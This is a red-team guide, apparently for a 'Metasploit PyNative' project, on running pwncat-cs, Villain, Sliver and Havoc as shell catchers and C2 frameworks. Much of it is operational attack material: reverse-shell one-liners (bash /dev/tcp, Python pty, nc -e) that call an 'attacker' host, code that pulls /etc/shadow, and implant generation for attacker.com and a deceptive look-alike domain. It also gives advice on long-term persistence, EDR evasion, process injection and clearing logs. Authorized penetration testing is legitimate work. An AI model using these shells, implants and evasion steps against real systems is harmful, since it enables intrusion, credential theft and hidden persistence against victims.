# Modern Shell Catchers and C2 Framework Integration Guide

## Overview

This guide covers the integration of modern shell catching tools and C2 (Command and Control) frameworks into Metasploit PyNative. These integrations provide professional-grade capabilities that scale well for red team operations, replacing basic netcat-style listeners with feature-rich platforms.

## Why Modern Shell Catchers?

Traditional shell catching with basic netcat or even MSF's multi/handler has limitations:

- **No automatic privilege escalation**
- **Limited post-exploitation features**
- **Poor session management at scale**
- **No built-in persistence**
- **Manual enumeration required**
- **Limited file transfer capabilities**

Modern shell catchers solve these problems with:

- ✅ **Automatic privilege escalation**
- ✅ **Rich post-exploitation modules**
- ✅ **Scalable session management**
- ✅ **Automated persistence**
- ✅ **Integrated enumeration**
- ✅ **Efficient file operations**

## Why Modern C2 Frameworks?

Basic shell access is just the beginning. Modern C2 frameworks provide:

- **Professional teamserver infrastructure**
- **Secure encrypted communications**
- **Advanced evasion techniques**
- **Team collaboration features**
- **Extensible architecture**
- **Professional-grade stability**

---

## Integrated Tools

### Shell Catchers

1. **pwncat-cs** - Advanced shell handler with automatic privilege escalation
2. **Villain** - Web-based shell handler with modern UI

### C2 Frameworks

1. **Sliver** - Modern Go-based C2 with multiple protocols
2. **Havoc** - Advanced C2 with GUI teamserver

---

## Installation Guide

### pwncat-cs

```bash
# Install via pip (included in requirements.txt)
pip install pwncat-cs

# Verify installation
pwncat-cs --version
```

**Requirements:**
- Python 3.9+
- Linux or macOS (Windows experimental)

### Villain

```bash
# Clone repository
cd /opt
git clone https://github.com/t3l3machus/Villain.git
cd Villain

# Install dependencies
pip install -r requirements.txt

# Run Villain
python3 Villain.py -h
```

**Requirements:**
- Python 3.8+
- Flask and dependencies

### Sliver

```bash
# Quick install
curl https://sliver.sh/install | sudo bash

# Or manual install
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server

# Verify installation
sliver-server version
```

**Requirements:**
- Linux, macOS, or Windows
- Go 1.19+ (for building from source)

### Havoc

```bash
# Clone repository
cd /opt
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Follow build instructions
# See Havoc/INSTALL.md for detailed steps

# Ubuntu/Debian dependencies
sudo apt install -y git build-essential cmake python3-dev \
    libboost-all-dev libssl-dev nasm mingw-w64 qtbase5-dev

# Build teamserver
cd teamserver
make

# Build client
cd ../client
make
```

**Requirements:**
- Linux (Ubuntu 20.04+ recommended)
- Build tools and dependencies
- Qt5 for GUI client

---

## Quick Start Examples

### Example 1: Catching Shells with pwncat-cs

```bash
# Using MSF module
msfconsole -q -x "use auxiliary/server/pwncat_listener; \
    set LHOST 0.0.0.0; set LPORT 4444; set PLATFORM linux; run"

# Or directly with Python
python3 -c "
from lib.msf.core.integrations.pwncat import PwncatIntegration

pwncat = PwncatIntegration({'lhost': '0.0.0.0'})
pwncat.initialize()
pwncat.execute('listen', host='0.0.0.0', port=4444, protocol='linux')
"
```

**Send reverse shell from victim:**
```bash
# Bash
bash -i >& /dev/tcp/attacker/4444 0>&1

# Python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Netcat
nc attacker 4444 -e /bin/bash
```

**Once connected, pwncat automatically:**
- Upgrades the shell to a full PTY
- Provides tab completion
- Enables command history
- Offers built-in enumeration

### Example 2: Managing Shells with Villain

```bash
# Start Villain server
use auxiliary/server/villain_server
set SRVHOST 0.0.0.0
set SRVPORT 6666
run

# Access web UI
firefox http://localhost:6666

# Generate payloads through UI
# Manage multiple shells through UI
# Execute commands with output capture
```

### Example 3: Setting up Sliver C2

```bash
# Start Sliver server
use auxiliary/integration/sliver_c2
set ACTION start_server
run

# In another terminal, start listener
use auxiliary/integration/sliver_c2
set ACTION start_listener
set LISTENER_PROTOCOL mtls
set LHOST 0.0.0.0
set LPORT 8888
run

# Generate implant
use auxiliary/integration/sliver_c2
set ACTION generate
set IMPLANT_OS windows
set IMPLANT_ARCH amd64
set LHOST your.server.com
set OUTPUT_PATH /tmp/implant.exe
run

# Deploy implant.exe on target
# Use sliver-client to interact with sessions
sliver-client
```

### Example 4: Havoc C2 Operations

```bash
# Start Havoc teamserver
use auxiliary/integration/havoc_c2
set ACTION start_teamserver
set SRVHOST 0.0.0.0
set SRVPORT 40056
run

# In another terminal, start client
use auxiliary/integration/havoc_c2
set ACTION start_client
run

# Use GUI to:
# - Configure listeners
# - Generate demon agents
# - Manage sessions
# - Execute post-exploitation modules
```

---

## Comparison Matrix

| Feature | pwncat-cs | Villain | Sliver | Havoc |
|---------|-----------|---------|--------|-------|
| **Type** | Shell Handler | Shell Handler/Light C2 | Full C2 | Full C2 |
| **UI** | CLI | Web | CLI + API | GUI |
| **Auto PrivEsc** | ✅ Yes | ❌ No | ✅ Yes | ✅ Yes |
| **Persistence** | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Yes |
| **Enumeration** | ✅ Built-in | ⚠️ Manual | ✅ Built-in | ✅ Built-in |
| **File Transfer** | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Yes |
| **Multi-Protocol** | ❌ TCP only | ❌ HTTP/HTTPS | ✅ mTLS/HTTP/DNS/WG | ✅ HTTP/HTTPS/SMB/TCP |
| **Process Injection** | ❌ No | ❌ No | ✅ Yes | ✅ Yes |
| **Token Manipulation** | ❌ No | ❌ No | ✅ Yes | ✅ Yes |
| **Team Server** | ❌ No | ⚠️ Web UI | ✅ Yes | ✅ Yes |
| **Extensible** | ⚠️ Limited | ⚠️ Limited | ✅ Yes | ✅ Yes (Python/BOF) |
| **Best For** | Quick shells | Web-based mgmt | Full red team | Modern red team |

---

## Use Case Scenarios

### Scenario 1: Quick Exploitation with Auto-PrivEsc

**Goal:** Quickly exploit a vulnerable service and get root

**Tool:** pwncat-cs

```bash
# Start listener
use auxiliary/server/pwncat_listener
set LHOST 0.0.0.0
set LPORT 4444
set AUTO_ENUM true
run

# Exploit service (from another MSF module)
# Once shell connects, pwncat will:
# 1. Upgrade to full PTY
# 2. Run enumeration
# 3. Attempt privilege escalation
# 4. Report findings
```

**Why pwncat:** Automatic privilege escalation saves time and ensures you get the highest privileges possible.

### Scenario 2: Managing Multiple Compromised Hosts

**Goal:** Manage 10+ compromised systems efficiently

**Tool:** Villain or Sliver

```bash
# Villain for web-based management
use auxiliary/server/villain_server
set SRVHOST 0.0.0.0
run

# Access web UI to:
# - See all active shells
# - Execute commands on multiple hosts
# - Transfer files
# - Manage sessions with ease
```

**Why Villain:** Web UI makes it easy to manage many systems at once without terminal juggling.

### Scenario 3: Long-Term Persistent Access

**Goal:** Maintain access to target network for weeks/months

**Tool:** Sliver or Havoc

```bash
# Sliver with multiple protocols
use auxiliary/integration/sliver_c2
set ACTION start_server
run

# Set up multiple listeners (mTLS, DNS, HTTP)
# Generate implants with different C2 profiles
# Deploy on targets
# Use session multiplexing for efficiency
```

**Why Sliver:** Multiple protocols provide redundancy, DNS for stealth, mTLS for security.

### Scenario 4: Team-Based Red Team Operation

**Goal:** Coordinate with team members during engagement

**Tool:** Havoc or Sliver

```bash
# Havoc teamserver
use auxiliary/integration/havoc_c2
set ACTION start_teamserver
run

# Team members connect clients
# Share access to compromised systems
# Collaborate on post-exploitation
# Track progress through GUI
```

**Why Havoc:** GUI teamserver makes collaboration seamless with visual session management.

### Scenario 5: Evading Detection

**Goal:** Maintain access while evading EDR/AV

**Tool:** Havoc or Sliver

**Havoc Features:**
- Sleep obfuscation
- Indirect syscalls
- Custom C2 profiles
- Malleable communication

**Sliver Features:**
- DNS tunneling
- WireGuard encryption
- HTTP(S) with custom headers
- Process injection/migration

```bash
# Generate obfuscated implant
# Configure sleep/jitter
# Use DNS or HTTPS for C2
# Enable process migration
```

---

## Advanced Features

### pwncat-cs Advanced Usage

```python
from lib.msf.core.integrations.pwncat import PwncatIntegration

pwncat = PwncatIntegration()
pwncat.initialize()

# Start listener
pwncat.execute('listen', host='0.0.0.0', port=4444)

# Once session established:

# Upload file
pwncat.execute('upload', 
              local_path='/opt/tools/linpeas.sh',
              remote_path='/tmp/linpeas.sh')

# Download file
pwncat.execute('download',
              remote_path='/etc/shadow',
              local_path='/tmp/shadow')

# Run enumeration
pwncat.execute('enum', module='all')

# Attempt privilege escalation
# pwncat does this automatically on connection
```

### Sliver Advanced Usage

```python
from lib.msf.core.integrations.sliver import SliverIntegration

sliver = SliverIntegration()
sliver.initialize()

# Start server
sliver.execute('start_server')

# Start multiple listeners
sliver.execute('start_listener', protocol='mtls', port=8888)
sliver.execute('start_listener', protocol='https', port=443)
sliver.execute('start_listener', protocol='dns', port=53)

# Generate implants for each
sliver.execute('generate', 
              os='windows',
              mtls_host='attacker.com',
              output='/tmp/implant_mtls.exe')

sliver.execute('generate',
              os='windows', 
              http_host='legit-looking-domain.com',
              output='/tmp/implant_https.exe')

# Execute commands on session
sliver.execute('execute',
              session_id='abc123',
              command='getuid')

# Process injection
sliver.execute('inject',
              session_id='abc123',
              pid=1234)
```

### Havoc Advanced Usage

```python
from lib.msf.core.integrations.havoc import HavocIntegration

havoc = HavocIntegration()
havoc.initialize()

# Start with custom profile
profile = '/opt/havoc_profiles/stealth.yaml'
havoc.execute('start_teamserver',
             host='0.0.0.0',
             port=40056,
             profile=profile)

# Connect client
havoc.execute('start_client')

# Use GUI to:
# - Configure sleep obfuscation (5-15 min jitter)
# - Set up HTTPS listener with valid TLS cert
# - Generate demon with indirect syscalls enabled
# - Configure process injection technique
# - Set up credential dumping jobs
# - Configure lateral movement tools
```

---

## Security Considerations

### Operational Security

1. **Use Encrypted Channels**
   - Sliver mTLS/WireGuard
   - Havoc HTTPS with valid certs
   - Avoid plaintext protocols in hostile networks

2. **Implement Sleep/Jitter**
   - Randomize beacon intervals
   - Avoid predictable patterns
   - Use realistic sleep times (5-15 minutes)

3. **Process Injection**
   - Migrate to legitimate processes
   - Avoid suspicious processes
   - Use common system processes

4. **Clean Up**
   - Remove implants after engagement
   - Clear logs where possible
   - Document all changes made

### Legal and Ethical Considerations

⚠️ **CRITICAL WARNING**: These tools are for authorized security testing ONLY.

**Legal Requirements:**
- ✅ **REQUIRED**: Obtain WRITTEN authorization before ANY use
- ✅ **REQUIRED**: Have signed contract with clear scope definition
- ✅ **REQUIRED**: Define explicit rules of engagement
- ✅ **REQUIRED**: Document ALL activities with timestamps
- ✅ **REQUIRED**: Have incident response plan
- ✅ **REQUIRED**: Clean up ALL artifacts after testing
- ✅ **REQUIRED**: Retain authorization documentation for audit

**Prohibited Actions:**
- ❌ **ILLEGAL**: Use on systems without explicit written permission
- ❌ **ILLEGAL**: Exceed authorized scope or timeline
- ❌ **ILLEGAL**: Retain access beyond engagement period
- ❌ **ILLEGAL**: Access data not covered by authorization
- ❌ **ILLEGAL**: Fail to disclose findings to client
- ❌ **ILLEGAL**: Use tools for personal gain or malicious purposes

**Note:** Unauthorized use of these tools may violate:
- Computer Fraud and Abuse Act (CFAA) - US
- Computer Misuse Act - UK
- Similar laws in other jurisdictions
- Potential criminal charges and civil liability

**ONLY use these tools:**
1. With explicit written authorization
2. Within defined scope and timeframe
3. For legitimate security testing purposes
4. In compliance with all applicable laws

**If you don't have proper authorization, DO NOT proceed.**

---

## Troubleshooting

### pwncat-cs Issues

**Problem:** Connection drops immediately

**Solution:**
```bash
# Ensure target shell is interactive
# Use pwncat with --verbose flag
pwncat-cs --listen --host 0.0.0.0 --port 4444 --platform linux -v
```

**Problem:** Privilege escalation fails

**Solution:**
```bash
# Manually run enumeration
(local) pwncat$ run enumerate.gather.suid
(local) pwncat$ run enumerate.gather.sudo
(local) pwncat$ run escalate.auto
```

### Villain Issues

**Problem:** Web UI not accessible

**Solution:**
```bash
# Check if port is open
netstat -tlnp | grep 6666

# Check firewall
sudo ufw allow 6666

# Try different port
python3 Villain.py -p 8080
```

### Sliver Issues

**Problem:** Implant won't connect

**Solution:**
```bash
# Verify listener is running
sliver-client -c "jobs"

# Check firewall
sudo ufw allow 8888

# Test with mtls first (most reliable)
# Then try other protocols
```

### Havoc Issues

**Problem:** Teamserver won't start

**Solution:**
```bash
# Check profile syntax
python3 -c "import yaml; yaml.safe_load(open('profile.yaml'))"

# Verify port availability
netstat -tlnp | grep 40056

# Check logs
tail -f /tmp/havoc_teamserver.log
```

---

## Best Practices

### 1. Start with pwncat-cs

For quick exploitation and initial access, start with pwncat-cs:
- Fast setup
- Automatic privilege escalation
- Good for single targets
- Easy to use

### 2. Scale up to Villain

When managing multiple systems:
- Web-based management
- Easy to organize shells
- Good for medium-scale operations

### 3. Use Full C2 for Persistence

For long-term access and advanced operations:
- **Sliver**: Multiple protocols, great CLI, API support
- **Havoc**: Modern GUI, team collaboration, extensible

### 4. Layer Your Access

Don't rely on a single tool:
1. Initial access with pwncat-cs
2. Deploy Sliver implant for persistence
3. Use both for redundancy

### 5. Match Tool to Objective

- **Quick pentest**: pwncat-cs
- **Web application testing**: Villain
- **Red team engagement**: Sliver or Havoc
- **Long-term persistence**: Sliver (DNS) or Havoc
- **Team operations**: Havoc (GUI teamserver)

---

## Resources

### Documentation

- **pwncat-cs**: https://pwncat.readthedocs.io/
- **Villain**: https://github.com/t3l3machus/Villain
- **Sliver**: https://sliver.sh/docs
- **Havoc**: https://havocframework.com/

### Community

- **pwncat-cs Discord**: https://discord.gg/pwncat
- **Sliver Discord**: https://discord.gg/sliver
- **Havoc Discord**: https://discord.gg/havoc

### Training

- **Sliver Workshop**: https://github.com/BishopFox/sliver/wiki/Sliver-Workshop
- **Havoc Tutorials**: Available in Havoc documentation

---

## Conclusion

The integration of modern shell catchers and C2 frameworks significantly upgrades Metasploit's post-exploitation capabilities:

1. **pwncat-cs** replaces basic netcat with automatic privilege escalation
2. **Villain** provides web-based shell management that scales
3. **Sliver** offers professional-grade C2 with multiple protocols
4. **Havoc** brings modern GUI teamserver for collaborative operations

These tools represent the current state of the art in post-exploitation and should be the default choice for serious red team operations.

**Remember:** Always use these tools ethically and legally, with proper authorization.

---

**Version:** 1.0.0  
**Last Updated:** 2025-12-14  
**Author:** P4x-ng
